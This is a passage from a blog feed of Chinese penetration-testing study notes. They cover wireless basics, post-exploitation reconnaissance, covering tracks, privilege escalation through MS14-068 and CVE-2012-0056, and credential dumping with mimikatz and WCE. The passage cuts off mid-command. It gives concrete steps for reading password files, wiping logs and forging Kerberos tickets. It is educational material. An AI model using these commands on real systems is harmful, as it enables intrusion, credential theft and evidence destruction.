    </entry>
    
    
    
    <entry>
      <title>无线网运行模式和硬件设备基础知识</title>
      <link href="/posts/3a078d95.html"/>
      <url>/posts/3a078d95.html</url>
      
        <content type="html"><![CDATA[<h2 id="无线网运行模式和硬件设备基础知识"><a href="#无线网运行模式和硬件设备基础知识" class="headerlink" title="无线网运行模式和硬件设备基础知识"></a>无线网运行模式和硬件设备基础知识</h2><h3 id="无线网络运行模式"><a href="#无线网络运行模式" class="headerlink" title="无线网络运行模式"></a>无线网络运行模式</h3><p>也称为无线网络架构，默认情况下有两种：</p><ul><li><p>Infrastructure</p><ul><li>AP维护SSID</li><li>至少包含一个AP和一个Station，形成一个Basic Service Set(BSS)</li><li>AP连接到有线网络，称为Distribution System(DS)</li><li>连接到同一个DS的多个AP形成一个Extended Service Set(ESS)</li></ul></li></ul><a id="more"></a><ul><li><p>Ad-Hoc</p><ul><li>STA维护SSID</li><li>也称为Independent Basic Service Set(IBSS)</li><li>也称为peer to peer 模式</li><li>其中一个STA负责AP的工作<ul><li>通过beacon广播SSID</li><li>对其它STAs进行身份验证</li></ul></li></ul><p>Service Set Identifier(SSID)</p><ul><li>AP每秒钟约10次通过Beacon帧广播SSID</li><li>客户端连接到无线网络后也会宣告SSID</li></ul></li></ul><h4 id="Wireless-Distribution-System-WDS"><a href="#Wireless-Distribution-System-WDS" class="headerlink" title="Wireless Distribution System(WDS)"></a>Wireless Distribution System(WDS)</h4><ul><li>与有线DS类似，只是用过无线连接的多个AP组成的网络<ul><li>Bridging——只有AP间彼此通信</li><li>Repeating——允许所有AP和STA彼此通信</li></ul></li></ul><h4 id="MONITOR-MODE"><a href="#MONITOR-MODE" class="headerlink" title="MONITOR MODE"></a>MONITOR MODE</h4><ul><li>并不是一种真正的无线模式</li><li>允许无线网卡没有任何筛选地抓包（802.11包头）</li><li>类比有线网络的混杂模式</li><li>适合的网卡和驱动不但可以monitor,更可以Injection</li></ul><h3 id="无线网硬件设备及基本概念"><a href="#无线网硬件设备及基本概念" class="headerlink" title="无线网硬件设备及基本概念"></a>无线网硬件设备及基本概念</h3><h4 id="无线网卡"><a href="#无线网卡" class="headerlink" title="无线网卡"></a>无线网卡</h4><ul><li>需要可以Monitor,可以Injection</li></ul><h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><ul><li>分贝dB<ul><li>测量无线信号强度</li></ul></li><li>B：向Alexander Graham Bell 致敬<ul><li>今天大部分声学设备的发明者和理论奠基人</li></ul></li><li>dB：表示2个信号之间的差异比率，用于描述设备的信号强度<ul><li>是一个相对值</li></ul></li><li>dBm：功率值与1mW进行比较的dB值结果</li><li>每增加3dBm，功率增加约1倍</li><li>每增加10dBm，功率约增加10倍</li><li>全向天线<ul><li>dBi：全向天线辐射强度</li><li>波形：甜甜圈</li><li>增益过高的全向天线会变成定向天线</li></ul></li><li>定向天线<ul><li>dBd：定向天线辐射强度</li><li>双四边形，定向发送信号，比全向天线距离更远（方向正确情况下）</li><li>八木天线，引向反射天线</li><li>平面天线：用于办公室，美观</li><li>扇形天线：常用于移动电话网络3到4个联合使用实现全向信号覆盖</li><li>网状天线：射束带更加集中，功率更强</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线通信基础知识-IEEE802.11标准</title>
      <link href="/posts/987a97f7.html"/>
      <url>/posts/987a97f7.html</url>
      
        <content type="html"><![CDATA[<h2 id="无线通信基础知识-IEEE-802-11标准"><a href="#无线通信基础知识-IEEE-802-11标准" class="headerlink" title="无线通信基础知识-IEEE 802.11标准"></a>无线通信基础知识-IEEE 802.11标准</h2><ul><li>无线技术特点<ul><li>行业迅猛发展</li><li>互联网重要入口</li><li>边界模糊</li><li>安全实施缺失而且困难</li><li>对技术不了解导致配置不当</li><li>企业网络私自接入AP破坏网络边界</li></ul></li></ul><a id="more"></a><h3 id="IEEE"><a href="#IEEE" class="headerlink" title="IEEE"></a>IEEE</h3><ul><li>Institute of Electrical and Electronics Engineers<ul><li>由通信航天生物电器电子等方面的科学家组成，目的是制定标准，知道行业发展。</li><li>IEEE分为不同的技术委员会（Committees），其中802委员会负责LAN、MAN标准的制定<ul><li>以太网</li><li>令牌环网</li><li>无线局域网</li><li>网桥</li></ul></li><li>IEEE 802.3是以太网，802.11是WLAN。标准只涉及数据链路层和物理层<ul><li>数据链路层<ul><li>逻辑链路控制子层LLC（802.2）</li><li>媒体访问控制子层MAC</li></ul></li></ul></li></ul></li></ul><h3 id="802-11标准"><a href="#802-11标准" class="headerlink" title="802.11标准"></a>802.11标准</h3><ul><li><p>发布于1997年</p></li><li><p>速率1或2Mbps</p></li><li><p>无线射频信号编码（调制）(radio frequencies)</p><ul><li>Direct-Sequence Spread-Spectrum(DSSS)直序扩频</li><li>Frequence Hopping Spread-Spectrum(FHSS)跳频扩频</li></ul></li><li><p>媒体访问方式——CSMA/CA</p><ul><li>根据算法侦听一定时长</li><li>发送数据包前发声明<ul><li>Request to Send/Clear to Send(RTS/CTS)</li></ul></li></ul></li><li><p>802委员会下第11组负责开发无线局域网标准</p></li><li><p>日常会涉及到的有a/b/g/n/i这几个标准</p></li></ul><h4 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a>802.11b</h4><ul><li><p>Complementary Code Keying(CCK) 补码键控</p><ul><li>5.5 and 11Mbit/s</li><li>2.4GHz band(2.4GHz-2.485GHz)</li><li>14个重叠的信道 channels</li><li>每个信道22MHz带宽</li><li>只有三个完全不重叠的信道</li></ul></li><li><p>美国 1-11（2.412GHz-2.462GHz）</p></li><li><p>欧洲 1-13（2.412GHz-2.472GHz）</p><p>日本 1-14（2.412GHz-2.484GHz）</p></li></ul><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a>802.11a</h4><ul><li>与802.11b几乎同时发布<ul><li>因设备价格问题一直没有得到广泛使用</li><li>使用5GHz带宽<ul><li>2.4GHz带宽干扰源多(微波、蓝牙、无绳电话)</li><li>5GHz频率有更多带宽空间，可容纳更多不重叠的信道</li><li>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<ul><li>正交频分复用（802.11b是直序扩频和跳频扩频）</li></ul></li><li>更高速率54Mbps,每个信道20MHz带宽</li><li>变频<ul><li>5.15-5.35GHz</li><li>5.7-5.8GHz</li></ul></li></ul></li></ul></li></ul><h4 id="802-11G"><a href="#802-11G" class="headerlink" title="802.11G"></a>802.11G</h4><ul><li>2.4GHz频率</li><li>Ortheognal Frequency-Division Multiplexing(OFDM)信号调制方法</li><li>与802.11a信速率相同</li><li>可全局降速，向后兼容802.11b,并切换为CCK信号调制方法</li><li>每个信道20/22MHz带宽</li></ul><h4 id="802-11N"><a href="#802-11N" class="headerlink" title="802.11N"></a>802.11N</h4><ul><li>2.4或5GHz频率<ul><li>300Mbps最高600Mbps</li><li>Multiple-Input Multiple-Output(MIMO)多进多出通信技术</li><li>多天线，多无线电波，独立收发信号</li><li>可以使用40MHz信道带宽，使数据传输速率翻倍</li></ul></li><li>全802.11n设备网络中，可以使用新报文格式，使速率达到最大</li><li>每个信道20/40MHz带宽</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>敏感信息收集与隐藏痕迹</title>
      <link href="/posts/55cc5e60.html"/>
      <url>/posts/55cc5e60.html</url>
      
        <content type="html"><![CDATA[<h3 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><ul><li><p>Linux</p><ul><li><table><thead><tr><th>查看信息</th><th>操作</th><th>备注</th></tr></thead><tbody><tr><td>DNS配置</td><td>/etc/resolv.conf</td><td>是否有机会DNS篡改，劫持</td></tr><tr><td>用户账号</td><td>/etc/passwd</td><td></td></tr><tr><td>用户密码</td><td>/etc/shadow</td><td></td></tr><tr><td>当前用户</td><td><code>whoami</code></td><td></td></tr><tr><td>所有登陆用户</td><td><code>who -a</code></td><td></td></tr><tr><td>网卡信息</td><td><code>ifconfig -a</code></td><td></td></tr><tr><td>防火墙设置</td><td><code>iptables -L -n</code></td><td></td></tr><tr><td>路由表</td><td><code>netstat -rn</code></td><td></td></tr><tr><td>操作系统信息</td><td><code>uname -a</code></td><td></td></tr><tr><td>当前运行的进程</td><td><code>ps aux</code></td><td></td></tr><tr><td>安装的软件包</td><td><code>dpkg -l</code></td><td></td></tr></tbody></table><a id="more"></a></li></ul></li></ul><ul><li><p>Windows</p><ul><li><table><thead><tr><th>查看信息</th><th>操作</th><th>备注</th></tr></thead><tbody><tr><td>ip掩码网关等</td><td>ipconfig /all</td><td></td></tr><tr><td>dns缓存</td><td>ipconfig /displaydns</td><td></td></tr><tr><td>开放端口及可执行程序</td><td>netstat -bano</td><td></td></tr><tr><td>路由表</td><td>netstat -r</td><td></td></tr><tr><td>共享</td><td>net view</td><td></td></tr><tr><td>共享</td><td>net view /domain</td><td></td></tr><tr><td>域信息</td><td>net user /domain</td><td></td></tr><tr><td>域信息</td><td>net usr %username% /domain</td><td></td></tr><tr><td>密码策略</td><td>net accounts</td><td></td></tr><tr><td>共享目录</td><td>net share</td><td></td></tr><tr><td>操作：把用户加入管理员组</td><td>net localgroup administrators username /add</td><td></td></tr><tr><td>域控制器主机</td><td>net group “Domain Controllers” /domain</td><td></td></tr><tr><td>操作：开共享</td><td>net share name$=C:/unlimited</td><td></td></tr><tr><td>操作：启动锁定账号</td><td>net user username /active:yes /domain</td><td></td></tr></tbody></table></li></ul></li></ul><h3 id="WMIC-Windows-Management-instrumentation"><a href="#WMIC-Windows-Management-instrumentation" class="headerlink" title="WMIC(Windows Management instrumentation)"></a>WMIC(Windows Management instrumentation)</h3><ul><li>被powershell的Get-WmiObject取代</li><li>Get-WmiObject又被Get-CimInstance取代</li><li>了解下Get-CimInstance</li><li>功能示例：<ul><li>查看网络登陆记录</li><li>查看当前进程，什么程序通过什么命令执行的进程</li><li>结束一个进程</li><li>查看操作系统安装的软件</li><li>静默删除软件</li><li>查看共享文件夹</li><li>开启“允许远程桌面”</li></ul></li></ul><h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><ul><li>商业信息</li><li>系统信息</li><li>Linux<ul><li>/etc;/usr/local/etc</li><li>/etc/passed;/etc/shadow</li><li>.ssh;.gnupg 公私钥</li><li>邮件和数据文件</li><li>业务数据库,身份认证服务器数据库</li><li>/tmp</li></ul></li><li>Windows<ul><li>SAM数据库；注册表文件</li><li>%SYSTEMROOT%\repair\SAM</li><li>%SYSTEMROOT%\System32\config\Regback\SAM</li><li>业务数据库，身份认证数据库</li><li>临时文件目录<ul><li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li></ul></li></ul></li></ul><h3 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h3><ul><li><p>Windows</p><ul><li>禁止在登录界面显示新建账号<ul><li>reg add 添加注册表项</li></ul></li><li>del %WINDIR%*.log /a/s/q/f</li></ul></li><li><p>Linux</p><ul><li><p>history</p><ul><li>history -c</li><li>rm .bash_history&amp;&amp;touch .bash_history&amp;&amp;chattr +i .bash_history</li></ul></li><li><p>/var/log/</p><ul><li>auth.log或secure  (REH)</li><li>btmp 或 wtmp 文件(命令：last或lastb)</li><li>lastlog和faillog命令</li></ul></li><li><p>其它日志和HIDS等</p></li></ul></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>Ubuntu网络更新源已经不可用，可以先mount安装光盘<code></code>，此时/etc/apt/sources.list会自动添加光盘为更新源，此时再安装软件包，如果光盘中有就可以成功安装。</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>scp</p><p>lsattr</p><p>chattr</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-利用配置不当提权</title>
      <link href="/posts/74125646.html"/>
      <url>/posts/74125646.html</url>
      
        <content type="html"><![CDATA[<h2 id="提权-利用配置不当提权"><a href="#提权-利用配置不当提权" class="headerlink" title="提权-利用配置不当提权"></a>提权-利用配置不当提权</h2><ul><li><p>与漏洞提权相比 更常用的方法</p><ul><li>企业环境</li><li>补丁更新全部已经安装</li><li>输入变量过滤之外更值得研发关注的安全隐患</li></ul></li></ul><a id="more"></a><h3 id="文件读写权限"><a href="#文件读写权限" class="headerlink" title="文件读写权限"></a>文件读写权限</h3><p>如果：</p><ul><li>以system/root权限启动</li><li>NTFS权限允许user修改删除</li></ul><p>那么：</p><ul><li><p>可以用自己的反弹shell，替换服务中的可执行程序</p></li><li><p>或者写一个把当前用户添加到管理员组的Cpp,编译成exe，替换某个程序。当管理员运行该程序时，提权成功。</p></li><li><p>Windows:icacls</p><ul><li><code>icacls c:\windows\\*.exe /save asd /T</code> 查看C:\windows下所有exe的权限</li><li>icacls具体使用方法去搜索</li></ul></li><li><p>Linux:find</p><ul><li><code>find / -perm 777 -exec ls -l {} \;</code></li></ul></li></ul><h3 id="应用系统的配置文件"><a href="#应用系统的配置文件" class="headerlink" title="应用系统的配置文件"></a>应用系统的配置文件</h3><ul><li>如果应用需要连接数据库，那么它的配置文件中很有可能有数据库的账号密码信息</li><li>后台服务运行账号应使用nobody等单独的账号。如果是root,那么通过服务漏洞进入系统直接就是root权限。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-利用漏洞提权</title>
      <link href="/posts/acfc05df.html"/>
      <url>/posts/acfc05df.html</url>
      
        <content type="html"><![CDATA[<h2 id="提权-利用漏洞提权"><a href="#提权-利用漏洞提权" class="headerlink" title="提权-利用漏洞提权"></a>提权-利用漏洞提权</h2><h2 id="Ms11-080"><a href="#Ms11-080" class="headerlink" title="Ms11-080"></a>Ms11-080</h2><ul><li><p>Kb2592799</p><ul><li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li></ul></li><li><p>先把python编译成exe，再在目标机器执行</p><a id="more"></a><ul><li><a href="https://pypi.org/project/pywin32/" target="_blank" rel="noopener">https://pypi.org/project/pywin32/</a> (pyinstaller会调用pywin32)</li><li>pyinstaller.org</li></ul></li></ul><figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit ms11-080<br>cp /usr/share/exploitdb/exploits/windows/local/18176.py .<br></code></pre></td></tr></table></figure><ul><li>如果目标机器有python环境，直接执行就可以。</li></ul><h2 id="Ms14-068"><a href="#Ms14-068" class="headerlink" title="Ms14-068"></a>Ms14-068</h2><ul><li><p>从本机管理员权限获取域管理员权限</p></li><li><ol><li><code>searchsploit ms14-068</code>得到35474.py</li><li><code>cp /usr/share/exploitdb/exploits/windows/remote/35474.py ~/ms14-068.py</code></li><li>在windows通过kali /usr/share/windows-resources/binaries/whoami.exe得到域用户的sid，还需要域控制器的ip。</li><li>使用漏洞利用代码生成TGT票据（kerbros协议的票据）<ul><li><code>python ms14-068.py -u u1@lab.com -s S-1-5-21-1226907004-2355705551-2341087478-1109 -d 192.168.0.119</code></li><li>输入u1域用户的密码</li></ul><ol start="5"><li>拷贝票据到windows系统</li></ol></li><li>通过minikatz完成提权<ul><li><code>kerberos::ptc TGT_u1@lab.com.ccache</code> </li></ul></li><li>发现可以访问域控制器的C盘</li></ol><ul><li>如果kali缺少python库文件，下载地址：<a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li></ul></li></ul><h2 id="CVE-2012-0056"><a href="#CVE-2012-0056" class="headerlink" title="CVE-2012-0056"></a>CVE-2012-0056</h2><ul><li><p>CVE-2012-0056</p><ul><li>/proc/pid/mem</li><li>kernels&gt;=2.6.39</li><li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a></li></ul></li><li><p>Ubuntu11.10</p><ul><li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10/</a></li></ul></li><li><p>gcc</p><ul><li><code>sudo apt-cdrom add</code>把光盘作为apt的更新源 </li><li><code>sudo apt-get install gcc</code></li><li><code>gcc 18411.c -o exp</code></li></ul></li><li><p>首先searchesploit 18411.c 找到文件位置 <code>/usr/share/exploitdb/exploits/linux/local</code></p></li><li><p>scp /usr/share/exploitdb/exploits/linux/local/18411.c <a href="mailto:flower@192.168.0.110">flower@192.168.0.110</a>:/home/flower</p></li><li><p>gcc编译好后，直接执行./exp，发现命令提示符$变为#，提权成功。</p></li></ul><h2 id="其它："><a href="#其它：" class="headerlink" title="其它："></a>其它：</h2><p>Ms08-067</p><p>Ms09-001</p><p>Ms10-017</p><p>Ms12-020</p><h3 id="Kali修改默认python为python3"><a href="#Kali修改默认python为python3" class="headerlink" title="Kali修改默认python为python3"></a>Kali修改默认python为python3</h3><ul><li><p><code>rm /usr/bin/python</code></p></li><li><p><code>ln -s /usr/bin/python3 /usr/bin/python</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows身份认证过程及工作组/域</title>
      <link href="/posts/2d3c3cc.html"/>
      <url>/posts/2d3c3cc.html</url>
      
        <content type="html"><![CDATA[<h2 id="Windows身份认证过程"><a href="#Windows身份认证过程" class="headerlink" title="Windows身份认证过程"></a>Windows身份认证过程</h2><ul><li>开机加载操作系统内核，windows启动之后，进入ntlogon.exe，即输入用户名和密码的界面。</li><li>当点击确定后，ntlogon.exe调用lsass.exe（Local Security Assistant）的LsaLogonUser API,该API 调用MSV_1_0身份验证程序包，MSV 身份验证包将用户记录存储在 SAM 数据库（C:\Windows\System32\config）中。<a id="more"></a><ul><li>ntlogon.exe会计算密码的LM(LAN Managere) Hash和NT(Windows NT) Hash</li><li>lsass.exe会将这两种hash与SAM数据库中的进行对比。</li><li>登陆成功后，会指派一个权限令牌，在该用户的lsass.exe进程中。</li></ul></li><li>远程登陆也是在本地计算好LMHash和NTHash，在网络中传输的是Hash而不是明文密码。</li><li>不同的登陆方式，在服务器端处理的方式也不同,大概有十几种：<ul><li>本地登陆：NTML security package</li><li>域登陆：域控制器服务器kerbros协议来响应，kerbros security package</li><li>远程登陆：remote desktopsecurity package</li><li>在多个服务器端的安全包中，其中有1个包（wdigest）在内存中缓存了当前登陆用户的明文密码</li></ul></li><li>推荐阅读<a href="https://support.microsoft.com/zh-cn/help/102716/ntlm-user-authentication-in-windows" target="_blank" rel="noopener">Windows 中的 NTLM 用户身份验证</a></li></ul><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><ul><li>工作组就类似于目录，谁想加入某个工作组只要把工作组名字改成那个工作组即可。</li><li>访问网络中的计算机（文件共享）默认使用Guest账号，需要在被访问的计算机启用Guest用户并允许Guest用户远程登陆<ul><li>启用Guest用户：此电脑–》管理–》本地用户和组–》用户–》Guest–》取消打勾“账户已禁用”。</li><li>允许用户远程登陆：控制面板–》管理工具–》本地安全策略–》本地策略–》用户权限分配–》找到 “拒绝从网络访问这台计算机”–》删掉其中的Guest这行。</li></ul></li></ul><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><ul><li>而域则有一个域控制器（安装ActiveDirectory域控制服务的主机）来注册和管理域中的设备。</li><li>加入域的计算机在开机时或注销后可以选择登陆到域还是登陆到本机。</li><li>登陆到域需要使用域的用户和密码，一般管理员会给每个人都分配一个用户名和密码。</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul><li>Win+R运行dcpromo将本机升级为域控制器</li><li>Win=R运行dsa.msc管理域中的用户和设备</li></ul><h2 id="微软账户和本地用户"><a href="#微软账户和本地用户" class="headerlink" title="微软账户和本地用户"></a>微软账户和本地用户</h2><ul><li>本地用户在数据在重装系统后丢失，微软账户可以同步OneDrive，邮件等等内容。</li></ul><h2 id="用户密码和PIN"><a href="#用户密码和PIN" class="headerlink" title="用户密码和PIN"></a>用户密码和PIN</h2><ul><li>PIN是Windows系统新添加的一套本地密码策略，不仅提高安全性，而且也可以让很多和账户相关的操作变得更加方便。与微软账户和本地用户无关。<ul><li>设置PIN:设置–》账户–》登陆选项–》Windows Hello PIN</li></ul></li></ul><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><ul><li>远程连接网络中的win10设备，需要在被连接的设备上设置”允许远程连接“，第一次连接需要输入用户名和密码，之后则需要在控制面板–》凭据管理器 中修改。</li><li>密码为空的账户默认无法远程登陆，需要在本地安全策略中修改。<ul><li>控制面板–》管理工具–》本地安全策略–》安全选项–》”账户：使用空密码的本地账户只允许进行控制台登陆“修改为禁用。</li></ul></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>微软相关认证MSCE,MCST等</p><p>SAM    (Security Account Manager)安全帐户管理器 </p><p>OWF    (One way function)单向函数</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-本地提权及几个工具(PwDump、WCE、mimikatz)</title>
      <link href="/posts/8b097a1d.html"/>
      <url>/posts/8b097a1d.html</url>
      
        <content type="html"><![CDATA[<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><ul><li>已实现本地低权限账号登陆<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获得更高权限<ul><li>实现对目标进一步控制</li></ul></li></ul><a id="more"></a><ul><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登陆时获取权限令牌</li><li>服务账号无需用户登陆已在后台启动的服务</li></ul></li><li>Windows<ul><li>user</li><li>Administrator</li><li>System</li></ul></li><li>Linux<ul><li>User</li><li>Root</li></ul></li></ul><h4 id="ADMIN提权为SYSTEM"><a href="#ADMIN提权为SYSTEM" class="headerlink" title="ADMIN提权为SYSTEM"></a>ADMIN提权为SYSTEM</h4><ul><li>Windows system账号<ul><li>系统设置管理功能</li><li>SysInternal Suite</li><li>XP:<code>at 17:07 /interactive cmd</code></li><li>Win7/8<code>sc Create syscmd binPath=&quot;cmd/K start type=own type=interact&quot;</code></li><li>进程注入提权（隐蔽性极强）：<ul><li>pinjector</li><li><code>pinjector.exe -p 656 cmd 5555</code>(656是PID,5555是开放的端口，可以使用nc等连接)</li></ul></li></ul></li></ul><h3 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h3><ul><li><p>Windows</p><ul><li>Wireshark</li><li>OmniPeek</li><li>commview</li><li>Sniffpass(提取密码)</li></ul></li><li><p>Linux</p><ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff</li></ul></li></ul><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><ul><li><p>klogger</p></li><li><p>木马窃取</p><ul><li>Darkcomet-RAT</li><li>…</li></ul></li></ul><h3 id="本地缓存密码"><a href="#本地缓存密码" class="headerlink" title="本地缓存密码"></a>本地缓存密码</h3><ul><li>浏览器缓存的密码<ul><li>IE浏览器</li><li>firefox</li></ul></li><li>网络密码</li><li>无线密码</li><li><a href="http://www.nirsoft.net" target="_blank" rel="noopener">http://www.nirsoft.net</a></li><li>Dump SAM<ul><li>Pwdump直接提取SAM数据库中的密码 (C:\Windows\System32\config\SAM）<ul><li>/usr/share/windows-binaries/fgdump/PwDump.exe</li><li><code>pwdump localhost</code>提取出windows密码的hash,保存为xp.pwdump</li><li>将xp.pwdump导入到kali中的ophdump暴破</li></ul></li></ul></li></ul><h3 id="WCE-Windows-credential-editor"><a href="#WCE-Windows-credential-editor" class="headerlink" title="WCE(Windows credential editor)"></a>WCE(Windows credential editor)</h3><ul><li><p>从内存中（wdigest）读取密码信息（参考<a href="https://pyrrhax.com/2020/09/22/Windows%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%8F%8A%E5%B7%A5%E4%BD%9C%E7%BB%84-%E5%9F%9F/" target="_blank" rel="noopener">Windows身份认证及工作组/域</a>），而不是从SAM数据库，可以避免一些操作系统的限制。</p></li><li><p>/usr/share/windows-resources/wce/</p></li><li><p>需要管理员权限</p></li><li><p>使用：</p><ul><li><p>wce-universal.exe -l / -lv 密文</p></li><li><p>wce-universal.exe -w 明文</p></li><li><p>-s参数还可以修改当前登陆用户的账户</p></li></ul></li><li><p>防止WCE攻击</p><ul><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages<ul><li>kerberos</li><li>msv1_0</li><li>schannel</li><li>wdigest(本地登陆) 删掉这一项，注意不要留空行。</li><li>tspkg(终端服务，远程桌面)</li><li>pku2u</li></ul></li></ul></li></ul><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><ul><li><code>::</code>查看用法</li><li><code>sekurlsa::wdigest</code> 查看用户与密码相关信息</li><li><code>process::list</code>查看进程及ID</li><li><code>process::suspend /pid:123</code> suspend进程ID为123的进程</li><li><code>ts::multirdp</code>打补丁，允许多用户同时登陆windows，互不干扰</li><li><code>event::clear</code>清除操作系统日志</li><li><code>evenv::drop</code>之后登陆不会再产生日志</li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>操作系统日志Win+R:eventvwr</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后渗透-文件传输</title>
      <link href="/posts/85ee9ddd.html"/>
      <url>/posts/85ee9ddd.html</url>
      
        <content type="html"><![CDATA[<h2 id="后渗透——文件传输"><a href="#后渗透——文件传输" class="headerlink" title="后渗透——文件传输"></a>后渗透——文件传输</h2><ul><li><p>上传工具</p></li><li><p>提权</p></li><li><p>擦除攻击痕迹</p></li><li><p>安装后门</p><ul><li>长期控制</li><li>Dump密码</li><li>内网渗透</li></ul></li><li><p>后漏洞利用阶段</p><ul><li>最大挑战——防病毒软件</li><li>使用合法的远程控制软件</li></ul></li></ul><a id="more"></a><h3 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传/下载文件"></a>上传/下载文件</h3><ul><li>持久控制</li><li>扩大对目标系统的控制能力</li></ul><h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><ul><li>netcat</li><li>curl</li><li>wget</li></ul><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul><li><p>缺少预装的下载工具</p></li><li><p>非交互式Shell</p><ul><li>类nc远程控制shell，无法与子命令交互</li><li>ftp 192.168.1.1</li></ul></li><li><p>使用TFTP传输文件</p><ul><li><p>XP、2003默认安装，其它需要单独添加</p></li><li><p>经常被便捷防火墙过滤</p></li><li><p>Kali</p><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">mkdir /tftp<br><span class="hljs-built_in">cd</span> /usr/share/windows-binaries<br>ls<br>cp /usr/share/windows-binaries/whoami.exe /tftp<br></code></pre></td></tr></table></figure></li></ul></li><li><p>使用FTP传输文件</p><ul><li><p>先在kali安装pure-ftpd</p><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt-get install pure-ftpd<br>groupadd ftpgroup<br>useradd -g ftpgroup -d /dev/null -s /etc ftpuser<br>pure-pw useradd pyrrhax -u ftpuser -d /ftphome<br>pure-pw mkdb<br><span class="hljs-built_in">cd</span> /etc/pure-ftpd/auth<br>ln -s ../conf/PureDB 60pdb<br>mkdir -p /ftphome<br>chown -R ftpuser:ftpgroup /ftphome/<br>/etc/init.d/pure-ftpd restart<br></code></pre></td></tr></table></figure></li><li><p>在windows使用cmd上下载文件</p><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> open 